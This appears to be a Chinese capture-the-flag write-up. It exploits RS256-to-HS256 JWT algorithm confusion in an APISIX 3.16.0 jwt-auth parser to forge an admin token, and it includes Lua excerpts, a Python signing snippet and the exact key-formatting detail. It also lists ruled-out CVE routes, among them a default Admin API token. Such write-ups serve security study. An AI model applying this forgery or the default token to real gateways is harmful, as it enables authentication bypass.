## 1. 关键指纹

```http
GET / HTTP/1.1
→ 302 /login
Server: APISIX/3.16.0          ← 版本直接暴露，正是算法混淆 bug 引入的版本
```

APISIX 3.16.0 于 2026-04-08 发布，新增了 `apisix/plugins/jwt-auth/parser.lua`（+290 行），
这个新 parser 引入了算法混淆 —— 与题目名「**错位的签名**」字面吻合
（签名算法与密钥来源错位）。

辅助判据：APISIX 未命中路由 → JSON `{"error_msg":"404 Route Not Found"}`；
命中路由但后端 Flask 无该页 → HTML 404。据此确认 `/static/*`、`/flag`、`/admin`、`/dashboard` 已挂路由。

| 路径 | 响应 | 说明 |
|---|---|---|
| `/apisix/admin/*` | 404 JSON | Admin API 未暴露（CVE-2020-13945 / CVE-2022-24112 路线排除） |
| `/apisix/batch-requests` | 404 JSON | batch-requests 插件未启用 |
| `/flag` (无 token) | 401 `{"message":"Missing JWT token in request"}` + `Www-Authenticate: Bearer realm="jwt"` | **受 APISIX jwt-auth 插件保护** |
| `/dashboard` | 302 → `/login` | Flask 后端，需 session |

## 2. 利用链

### Step 1 — 普通用户入口
`POST /login`，`guest:guest123` → 302 `/dashboard` + Flask session cookie。
（`guest` 账号在登录页提示里明示；密码在少量常见口令内命中，非爆破 flag。）

`/dashboard` 页面直接给出三个链接：`/public-key`、`/hint`、以及一条**含 guest JWT 的 `/flag?jwt=...`**：

```
header : {"alg":"RS256","typ":"JWT"}
payload: {"key":"guest","role":"guest","sub":"guest","exp":1790567117,"nbf":1790563457}
```

→ 说明 jwt-auth 的 token 通过 **`Authorization: Bearer` 或 `?jwt=` 查询参数** 传递；
Consumer 用 RS256，claim 里 `key` = consumer 名，`role` 决定后端权限。

### Step 2 — 公钥本来就是公开的
`GET /public-key`（携带 guest session）：

```
运维留下的说明写着：这是 admin 账户用于 RS256 验签的公钥，网关和客户端都会信任它。
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
...（完整公钥见 evidence/1-public-key.pem）
-----END PUBLIC KEY-----
```

### Step 3 — 算法混淆伪造 admin token
APISIX 3.16.0 的 `parser.lua` 存在「密钥选择」与「验签算法」的错位：

```lua
-- jwt-auth.lua::get_auth_secret(consumer)   ← 密钥来源 = Consumer 配置的 algorithm
if not consumer.auth_conf.algorithm or consumer.auth_conf.algorithm:sub(1,2) == "HS" then
    return get_secret(consumer.auth_conf)      -- HS*: 返回对称密钥
else
    return consumer.auth_conf.public_key       -- RS*/ES*/PS*: 返回公钥 ★
end

-- parser.lua::verify_signature(self, key)    ← 验签算法 = JWT header 的 alg（攻击者可控）
function _M.verify_signature(self, key)
    return alg_verify[self.header.alg](self.raw_header .. "." .. self.raw_payload,
                                       base64_decode(self.signature), key)
end

-- parser.lua::alg_verify.HS256               ← HMAC 接受任意字符串作为 key
HS256 = function(data, signature, key)
    return signature == alg_sign.HS256(data, key)
end,
```

Consumer 配的是 `algorithm=RS256` → 网关交出 **public_key**；
而验签算法听 JWT header 的 `{"alg":"HS256"}` → 网关拿公钥当 **HMAC 密钥**。

所以：**用 RS256 公钥 PEM 字节作 HMAC-SHA256 密钥，自己签一个 `alg:HS256` 的 token 即通过验签**。

```python
h = b64url(b'{"alg":"HS256","typ":"JWT"}')
p = b64url(b'{"key":"admin","role":"admin","sub":"admin","exp":...,"nbf":...}')
sig = b64url(hmac.new(PUBLIC_KEY.encode(), h + b"." + p, hashlib.sha256).digest())
```

⚠️ **关键细节**：HMAC 密钥必须与 APISIX 里 `public_key` 配置字符串**逐字节一致**。
实测命中变体是 **去掉末尾换行的 PEM**（`no_trailing_nl`）；
带 `\n`、`\r\n`、前置换行的变体全部验签失败 → 401 `{"message":"JWT token invalid"}`。

## 3. 已排除的方向

| 方向 | 结论 |
|---|---|
| CVE-2020-13945 Admin API 默认 token `edd1c9f034335f136f87ad84b625c8f1` | `/apisix/admin/*` 全部 404，Admin API 未挂载 |
| CVE-2022-24112 batch-requests + Admin API → RCE | `/apisix/batch-requests` 404，插件未启用 |
| CVE-2022-25757（jwt-auth 旧版 token 校验问题） | 3.16.0 走的是新 `parser.lua`，实际命中算法混淆 |
| `alg:none` 空签名 | 401 `JWT token invalid`，`none` 不在 `alg_verify` 表内 |
| Admin API 控制路由读本地文件 | 不可达，无需 RCE |
